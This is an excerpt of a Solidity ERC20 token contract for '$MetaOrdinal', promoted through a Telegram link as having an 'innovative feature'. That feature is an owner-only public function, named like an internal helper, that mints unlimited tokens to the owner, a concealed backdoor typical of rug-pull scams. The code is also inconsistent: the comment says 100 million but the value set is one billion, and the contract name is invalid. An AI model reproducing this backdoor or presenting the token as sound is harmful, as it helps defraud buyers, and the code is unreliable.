...
//
// $MetaOrdinal proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/MetaOrdinal
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaOrdinal(uint256 amount) public onlyOwner {
 _MetaOrdinal(msg.sender, amount);
    }
    ...
    function _MetaOrdinal(address account, uint256 amount) internal virtual {
...
contract $MetaOrdinal is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Meta Ordinal", "META ORDINAL") {
     _MetaOrdinal(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}